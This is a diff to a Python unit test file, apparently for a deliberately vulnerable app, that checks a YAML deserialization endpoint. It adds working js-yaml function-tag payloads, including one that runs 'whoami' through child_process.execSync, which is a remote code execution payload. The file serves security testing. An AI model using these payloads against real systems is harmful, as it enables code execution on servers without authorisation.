@@ -41,14 +41,16 @@ class DeserializationTest(unittest.TestCase):
         )
 
     def test_02_yaml_deserialization(self):
-        """Test YAML deserialization vulnerability"""
-        # Start with a simple YAML object
+        """Test YAML deserialization vulnerability using toString function execution"""
+        # Basic test with Date.now()
         payload = {
-            "data": "!!map\n  fn: !!js/function 'function() { return \"pwned\"; }'\n  value: test"
+            "data": "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1"
         }
 
         response = requests.post(
-            f"{self.base_url}/api/deserialize/yaml", json=payload, headers=self.headers
+            f"{self.base_url}/api/deserialize/yaml",
+            json=payload,
+            headers=self.headers
         )
 
         self.assertEqual(
@@ -56,6 +58,24 @@ class DeserializationTest(unittest.TestCase):
         )
         self.assertIn(
             "result", response.json(), "Response should contain 'result' field"
+        )
+
+        # RCE test with command execution
+        payload_rce = {
+            "data": "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return require(\"child_process\").execSync(\"whoami\").toString()}' } : 1"
+        }
+
+        response_rce = requests.post(
+            f"{self.base_url}/api/deserialize/yaml",
+            json=payload_rce,
+            headers=self.headers
+        )
+
+        self.assertEqual(
+            response_rce.status_code, 200, "YAML RCE endpoint should be accessible"
+        )
+        self.assertIn(
+            "result", response_rce.json(), "Response should contain 'result' field"
         )
 
     def test_03_eval_deserialization(self):
